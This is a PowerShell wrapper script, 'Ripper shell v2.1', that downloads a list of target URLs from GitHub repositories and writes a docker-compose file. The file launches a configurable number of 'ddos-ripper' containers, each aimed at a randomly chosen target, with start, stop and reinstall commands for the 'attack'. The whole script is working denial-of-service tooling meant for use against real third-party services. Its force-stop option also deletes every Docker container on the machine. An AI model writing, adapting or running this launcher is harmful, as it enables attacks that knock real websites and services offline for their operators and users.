param ($Action, $Number=10, $Force=$false)
# Stop script if fail by default
# $ErrorActionPreference = "Stop"
# Ripper shell v2.1
# 1.0 - initial script (uses local urls.txt file)
# 2.0 - added external mirror for url list
# 2.1 - added possibility to limit number of containers (for less powerful machines like 13in mbp pre M1)


$VERSION = '2.1'
# $TARGETS_URL = 'https://raw.githubusercontent.com/ValeryP/help-ukraine-win/main/web-ddos/public/targets.txt'
$TARGETS_URL='https://raw.githubusercontent.com/myvocabu/ripper-wrapper/main/targets.json'
$TARGETS_URL_BACKUP = 'https://raw.githubusercontent.com/nitupkcuf/ripper-wrapper/main/targets.json'
$URLS

function Print-Help {
    Write-Host "Usage: wibdows_ripper.sh -Action install [-Number 10]"
    Write-Host "-Action (install, start, stop)"
    Write-Host "        install - first run or to update targets"
    Write-Host "        stop - stop attack"
    Write-Host "        start - resume attack"
    Write-Host "-Number - number of containers to start, if not used then 10 used"
}


function Print-Version {
    Write-Host $VERSION
}


function Check-Dependencies {
    if ( -not $(docker -v) ) {
        Write-Host "Please install docker first. https://www.docker.com/products/docker-desktop"
        exit 1
    }
}


function Generate-Compose {
    # URLS
    $HTTP_Request = [System.Net.WebRequest]::Create($TARGETS_URL)
    $HTTP_Response = $HTTP_Request.GetResponse()
    $HTTP_Status = [int]$HTTP_Response.StatusCode
    If ($HTTP_Response) {
        $HTTP_Response.Close()
    }

    If ($HTTP_Status -eq 200) {
        echo "111"
        Invoke-WebRequest -Uri $TARGETS_URL -OutFile targets.txt
        $URLS = Get-Content targets.txt
    }
    Else {
        Invoke-WebRequest -Uri $TARGETS_URL_BACKUP -OutFile targets.json
        $URLS = Get-Content targets.json | ConvertFrom-Json
    }

    # docker-compose.yml
    Remove-Item -Path docker-compose.yml
    Add-Content -Path docker-compose.yml -Value "version: '3'"
    Add-Content -Path docker-compose.yml -Value "services:"
    for ( $i=1; $i -le $Number; $i++ ) {
        $LineID = Get-Random -Maximum $URLS.Length
        $Line = $URLS[$LineID]
        Add-Content -Path docker-compose.yml -Value "  ddos-runner-${i}:"
        Add-Content -Path docker-compose.yml -Value "    container_name: ${i}-$($Line -replace '[\W]', '.' )"
        Add-Content -Path docker-compose.yml -Value "    image: nitupkcuf/ddos-ripper:latest"
        Add-Content -Path docker-compose.yml -Value "    restart: always"
        Add-Content -Path docker-compose.yml -Value "    command: ${Line}"
    }
}


function Ripper-Start {
  Write-Host "Starting ripper attack"
  docker-compose up -d
}


function Ripper-Stop {
    Write-Host "Stopping ripper attack"
    if ( docker-compose ls -q ) {
        docker-compose down
    }
    if ( $Force ) {
        try {
            $(docker rm -f $(docker ps -a -q))
        } catch {
            "Nothing to stop"
        }
    }
}


Check-Dependencies

if ( -not $Action ) {
    Print-Help
    exit 0
} elseif ( $Action -eq "install" ) {
    Ripper-Stop
    Generate-Compose
    Ripper-Start
    exit 0
} elseif ( $Action -eq "start" ) {
    Ripper-Start
    exit 0
} elseif ( $Action -eq "stop" ) {
    Ripper-Stop
    exit 0
}

Print-Help
exit 1